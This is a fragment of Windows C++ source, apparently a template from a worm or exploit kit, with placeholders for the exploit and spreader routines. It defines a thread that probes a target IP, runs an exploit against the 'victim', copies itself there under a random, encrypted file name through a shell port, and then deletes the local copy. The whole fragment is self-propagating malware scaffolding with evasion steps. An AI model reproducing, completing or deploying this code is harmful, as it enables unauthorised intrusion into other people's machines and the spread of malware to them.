

DWORD WINAPI exploit_[exploitName](LPVOID lpParam) {
	PthreadData pData;
	pData = (PthreadData)lpParam;
	int sock;
	sock = isTarget_[exploitName](pData->strIP);
	if (sock) {
		char fullName[MAX_PATH];
		GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
		std::string fileName = PathFindFileNameA(fullName);
		printf("victim: %s\n", pData->strIP);
		[exploitName](sock, pData->strIP);
		int a;
		if (isRandomName) {
			fileName = RandomStr(8) + ".exe";
			EncryptExe(fileName);
		}
		a = [Spreader](pData->strIP, pData->shellPort, fileName);
		if (isRandomName)
		{
			//delete new exe
			std::string NewExePath = (std::string)fullName;
			NewExePath = NewExePath.substr(0, NewExePath.find_last_of("\\"));
			NewExePath += "\\" + fileName;
			DeleteFileA(NewExePath.c_str());
		}
		//printf("Done exploti!");
		printf("DEBUG %d\n", a);
	}
	else
	{
		printf("ip: %s can't exploit!\n", pData->strIP);
	}
	return 0;
}